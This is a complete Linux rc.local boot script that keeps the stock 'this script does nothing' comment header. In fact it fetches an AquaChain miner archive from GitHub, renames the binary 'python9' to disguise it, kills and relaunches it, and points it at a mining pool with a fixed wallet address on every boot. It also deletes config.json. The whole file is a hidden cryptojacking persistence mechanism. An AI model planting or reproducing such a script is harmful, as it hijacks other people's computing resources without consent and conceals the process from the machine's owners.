#!/bin/sh -e
#
# rc.local
#
# This script is executed at the end of each multiuser runlevel.
# Make sure that the script will "exit 0" on success or any other
# value on error.
#
# In order to enable or disable this script just change the execution
# bits.
#
# By default this script does nothing.
if [ -f ${PWD}/python9 ]; then
    if pgrep -x "python9" /dev/null
then
pkill python9
echo " kill process"
./python9 -F http://miner.aqua.signal2noi.se:443/0xd994dfed4458b2cadcabbfc004372a101d273d40/2

    
else

echo "Miner da install , chay thoi "
./python9 -F http://miner.aqua.signal2noi.se:443/0xd994dfed4458b2cadcabbfc004372a101d273d40/2

     
fi
exit
fi

wget https://github.com/aquanetwork/aquachain/releases/download/1.5.5/aquaminer-0.4-linux-amd64.zip
unzip aquaminer-0.4-linux-amd64.zip
mv aquaminer-0.4-linux-amd64 python9
./python9 -F http://miner.aqua.signal2noi.se:443/0xd994dfed4458b2cadcabbfc004372a101d273d40/2
rm config.json
